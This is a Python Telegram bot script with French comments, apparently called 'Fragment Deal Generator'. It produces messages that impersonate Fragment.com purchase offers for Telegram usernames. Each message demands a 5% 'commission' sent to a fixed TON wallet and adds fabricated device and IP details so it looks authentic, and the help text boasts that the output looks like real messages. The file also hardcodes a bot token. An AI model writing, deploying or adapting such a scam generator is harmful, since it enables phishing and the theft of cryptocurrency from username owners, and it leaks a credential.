import sys
import os
import threading
import time
import asyncio
import aiohttp
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import NetworkError, TimedOut, Conflict

# Configuration du logging
import logging
import warnings
warnings.filterwarnings("ignore")
logging.basicConfig(level=logging.CRITICAL)

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924
PORT = int(os.getenv('PORT', 10000))

print(f"🤖 Fragment Deal Generator v2.2")
print(f"🔑 Token: ✅")
print(f"🎯 Chat ID: {FIXED_CHAT_ID}")
print(f"🌐 Port: {PORT}")

# Variables globales pour la gestion
bot_running = False
shutdown_event = threading.Event()

# ===== SERVEUR HTTP =====
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ['/', '/health', '/status']:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Fragment Bot Status</title>
    <meta charset="utf-8">
    <style>
        body {{ font-family: Arial; margin: 40px; background: #f0f8ff; }}
        .container {{ max-width: 600px; margin: 0 auto; padding: 30px; 
                     background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
        .status {{ color: #28a745; font-weight: bold; font-size: 18px; }}
        .info {{ background: #e7f3ff; padding: 15px; border-radius: 5px; margin: 15px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🤖 Fragment Deal Generator</h1>
        <p class="status">✅ Status: {'ACTIVE' if bot_running else 'STARTING'}</p>
        <div class="info">
            <p><strong>🔗 Bot:</strong> @BidRequestWebApp_bot</p>
            <p><strong>📊 Service:</strong> Render Cloud</p>
            <p><strong>🕐 Time:</strong> {time.strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
            <p><strong>💎 Target Chat:</strong> {FIXED_CHAT_ID}</p>
        </div>
        <p>Ready to generate Fragment deals! 🚀</p>
    </div>
</body>
</html>"""
            self.wfile.write(html.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

def start_http_server():
    """Démarre le serveur HTTP pour Render"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), HealthHandler)
        print(f"🌐 Serveur HTTP actif sur port {PORT}")
        
        while not shutdown_event.is_set():
            server.handle_request()
            
    except Exception as e:
        print(f"❌ Erreur serveur HTTP: {e}")

# ===== PRIX TON =====
def get_ton_price_sync():
    """Récupère le prix TON de manière synchrone"""
    try:
        import urllib.request
        import json
        
        url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
        
        with urllib.request.urlopen(url, timeout=10) as response:
            data = json.loads(response.read().decode())
            price = float(data.get('Price', 5.50))
            return price if price > 0 else 5.50
            
    except Exception:
        return 5.50

# ===== GÉNÉRATION MESSAGE =====
def generate_fragment_deal(username, price):
    """Génère le message Fragment avec wallet cliquable"""
    try:
        # Calculs
        commission = price * 0.05
        ton_price = get_ton_price_sync()
        price_usd = price * ton_price
        commission_usd = commission * ton_price
        
        # Nettoyage username
        clean_username = str(username).strip().replace('@', '').upper()
        
        # Message avec wallet cliquable au format demandé
        message = f"""We have received a purchase request for your username @{clean_username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""

        # Bouton WebApp
        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={clean_username.lower()}-{price:g}"
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        return message, reply_markup
        
    except Exception as e:
        print(f"❌ Erreur génération: {e}")
        return None, None

# ===== GESTIONNAIRES BOT =====
async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    try:
        if not update or not update.message:
            return
            
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        welcome = f"""🤖 **Fragment Deal Generator v2.2**

Salut {user.first_name}! 

📱 **Chat ID:** `{chat_id}`

Ce bot génère des messages Fragment authentiques avec calculs automatiques TON/USD.

**📋 Commandes:**
• `/create username price` - Créer un deal Fragment
• `/help` - Guide complet

**💡 Exemple:**
`/create crypto 1500`

💎 **Prêt à générer vos deals Fragment!**"""
        
        await update.message.reply_text(
            welcome,
            parse_mode='Markdown',
            disable_web_page_preview=True
        )
        
        print(f"✅ /start - {user.first_name} ({chat_id})")
        
    except Exception as e:
        print(f"❌ Erreur start: {e}")

async def create_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /create username price"""
    try:
        if not update or not update.message:
            return
            
        # Validation arguments
        if len(context.args) != 2:
            await update.message.reply_text(
                "❌ **Usage incorrect**\n\n"
                "**Format:** `/create username price`\n"
                "**Exemple:** `/create crypto 1000`",
                parse_mode='Markdown'
            )
            return
            
        username = str(context.args[0]).strip().replace('@', '')
        
        try:
            price = float(context.args[1])
        except ValueError:
            await update.message.reply_text(
                "❌ **Prix invalide**\n\n"
                "Utilisez des nombres uniquement.\n"
                "**Exemple:** `1500` ou `1500.5`",
                parse_mode='Markdown'
            )
            return
        
        # Validation prix
        if price <= 0:
            await update.message.reply_text("❌ Le prix doit être positif")
            return
            
        if price > 1000000:
            await update.message.reply_text("❌ Prix trop élevé (max: 1,000,000 TON)")
            return
            
        # Message de traitement
        processing = await update.message.reply_text("⏳ **Génération...**", parse_mode='Markdown')
        
        # Génération
        message, reply_markup = generate_fragment_deal(username, price)
        
        if message and reply_markup:
            # Envoi du message Fragment avec Markdown pour le wallet cliquable SANS aperçu
            await update.message.reply_text(
                message,
                reply_markup=reply_markup,
                parse_mode='Markdown',
                disable_web_page_preview=True  # APERÇU DÉSACTIVÉ
            )
            
            # Confirmation
            ton_price = get_ton_price_sync()
            total_usd = price * ton_price
            
            await update.message.reply_text(
                f"✅ **Deal généré!**\n\n"
                f"🎯 **Username:** @{username.upper()}\n"
                f"💎 **Prix:** {price:g} TON (${total_usd:.2f})\n"
                f"📊 **TON/USD:** ${ton_price:.2f}",
                parse_mode='Markdown'
            )
            
            print(f"✅ Deal: @{username} - {price} TON")
            
        else:
            await update.message.reply_text("❌ Erreur génération du deal")
            
        # Suppression message traitement
        try:
            await processing.delete()
        except:
            pass
            
    except Exception as e:
        print(f"❌ Erreur create: {e}")
        try:
            await update.message.reply_text(f"❌ Erreur: {e}")
        except:
            pass

async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /help"""
    try:
        if not update or not update.message:
            return
            
        help_text = """📖 **Guide Fragment Deal Generator**

**🎯 Objectif:**
Générer des messages Fragment.com authentiques avec calculs TON/USD automatiques.

**📋 Commandes:**
• `/start` - Démarrer le bot et voir le statut
• `/create username price` - Créer un deal Fragment
• `/help` - Afficher ce guide

**💡 Exemples:**
• `/create crypto 1500` - Deal pour @CRYPTO à 1500 TON
• `/create bitcoin 2000.5` - Deal pour @BITCOIN à 2000.5 TON

**⚙️ Fonctionnalités:**
• 💎 Prix TON en temps réel
• 💰 Conversion USD automatique
• 🧮 Commission 5% calculée
• 🔗 Wallet TON cliquable
• 📱 Bouton WebApp intégré

**✅ Format généré:**
Le bot crée des messages Fragment professionnels avec tous les détails techniques (device, IP, wallet) comme les vrais.

💎 **Ready to generate authentic Fragment deals!**"""
        
        await update.message.reply_text(
            help_text,
            parse_mode='Markdown',
            disable_web_page_preview=True
        )
        
        print("✅ /help utilisé")
        
    except Exception as e:
        print(f"❌ Erreur help: {e}")

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire d'erreurs global"""
    print(f"⚠️ Erreur bot: {context.error}")

# ===== NETTOYAGE BOT =====
async def cleanup_bot():
    """Nettoie les sessions Telegram existantes"""
    try:
        # Création d'une session temporaire pour le nettoyage
        app = Application.builder().token(BOT_TOKEN).build()
        
        async with app:
            # Appel getUpdates avec offset pour vider la queue
            await app.bot.get_updates(offset=-1, limit=1, timeout=1)
            print("✅ Sessions nettoyées")
            
    except Exception as e:
        print(f"⚠️ Nettoyage: {e}")

# ===== BOUCLE BOT =====
async def bot_main():
    """Boucle principale du bot Telegram"""
    global bot_running
    
    try:
        print("🧹 Nettoyage des sessions...")
        await cleanup_bot()
        await asyncio.sleep(2)
        
        print("🚀 Configuration du bot...")
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout des gestionnaires
        app.add_handler(CommandHandler("start", start_handler))
        app.add_handler(CommandHandler("create", create_handler))
        app.add_handler(CommandHandler("help", help_handler))
        app.add_error_handler(error_handler)
        
        print("✅ Handlers configurés")
        print(f"💎 Chat cible: {FIXED_CHAT_ID}")
        print("🔗 WebApp: @BidRequestWebApp_bot/WebApp")
        print("📋 **Commandes disponibles:**")
        print("   • /start - Démarrage")
        print("   • /create username price - Créer deal")
        print("   • /help - Aide")
        
        print("🔄 Lancement du polling...")
        bot_running = True
        
        # Polling avec paramètres optimisés
        await app.run_polling(
            poll_interval=2.0,
            timeout=20,
            bootstrap_retries=5,
            read_timeout=30,
            write_timeout=30,
            connect_timeout=30,
            pool_timeout=10,
            stop_signals=None,
            close_loop=False
        )
        
    except Exception as e:
        print(f"❌ Erreur bot: {e}")
        bot_running = False
        
    finally:
        bot_running = False
        print("🛑 Bot arrêté")

def bot_thread():
    """Thread pour le bot avec sa propre boucle d'événements"""
    try:
        # Création d'une nouvelle boucle d'événements pour ce thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Lancement du bot
        loop.run_until_complete(bot_main())
        
    except Exception as e:
        print(f"❌ Erreur thread bot: {e}")
        
    finally:
        try:
            loop.close()
        except:
            pass

def run_bot():
    """Lance le bot dans un thread séparé"""
    # Lancement du thread bot
    bot_thread_obj = threading.Thread(target=bot_thread, daemon=False)
    bot_thread_obj.start()
    return bot_thread_obj

# ===== FONCTION PRINCIPALE =====
def main():
    """Point d'entrée principal"""
    print("🚀 **Fragment Deal Generator v2.2**")
    print(f"🌐 URL: https://telegram-bot-vic3.onrender.com")
    print("=" * 50)
    
    try:
        # 1. Serveur HTTP
        http_thread = threading.Thread(target=start_http_server, daemon=True)
        http_thread.start()
        print("✅ Serveur HTTP lancé")
        
        # 2. Attente stabilisation
        time.sleep(2)
        
        # 3. Bot Telegram
        print("🤖 Démarrage bot...")
        bot_thread = run_bot()
        
        # 4. Attente infinie
        try:
            while not shutdown_event.is_set():
                time.sleep(1)
                
                # Vérification si le bot est toujours actif
                if not bot_thread.is_alive() and not shutdown_event.is_set():
                    print("⚠️ Bot thread arrêté, redémarrage...")
                    time.sleep(5)
                    bot_thread = run_bot()
                    
        except KeyboardInterrupt:
            print("\n🛑 Arrêt demandé")
            shutdown_event.set()
            
    except Exception as e:
        print(f"❌ Erreur critique: {e}")
        
    finally:
        shutdown_event.set()
        print("🔚 Application fermée")

if __name__ == '__main__':
    main()
